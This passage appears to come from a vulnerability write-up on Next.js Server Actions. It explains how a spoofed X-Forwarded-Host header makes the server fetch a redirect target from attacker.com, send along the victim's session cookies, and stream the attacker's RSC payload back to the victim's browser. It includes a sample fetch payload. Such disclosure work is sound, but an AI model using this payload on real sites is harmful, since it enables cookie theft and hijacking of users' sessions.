The response body is directly returned as a `FlightRenderResult` and streamed to the victim's browser under the origin of the target app (`victim-server-actions.com`), leading to complete client-side application hijacking, UI modification, and execution of arbitrary code/actions in the victim's browser context.

### Conceptual Exploit Payload
A cross-origin fetch request sent from `https://attacker.com` to target a Server Action that triggers a redirect:
```javascript
fetch('https://victim-server-actions.com/endpoint', {
  method: 'POST',
  headers: {
    'X-Forwarded-Host': 'attacker.com',
    'Next-Action': 'action-id-that-redirects-on-success'
  },
  body: JSON.stringify({ arg: 'val' })
});
```
When successful, the Server Action calls `redirect('/dashboard')`. Next.js processes this internally by making a `GET` request to `https://attacker.com/dashboard` with the victim client's session cookies. The attacker's server at `https://attacker.com/dashboard` returns a malicious RSC payload with `Content-Type: text/x-component`, which the Next.js server streams back to the victim's browser, hijacking the UI.

